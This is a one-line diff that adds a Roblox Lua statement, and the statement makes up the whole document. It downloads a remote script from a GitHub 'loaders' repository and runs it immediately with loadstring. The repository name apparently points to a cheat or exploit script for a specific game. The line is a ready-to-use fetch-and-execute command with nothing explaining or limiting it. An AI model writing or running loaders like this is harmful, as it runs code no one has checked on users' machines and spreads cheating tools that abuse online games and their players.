@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/tusk-4-new-stands-morioh-high-spam3-syronj0codx1qv.lua"))()
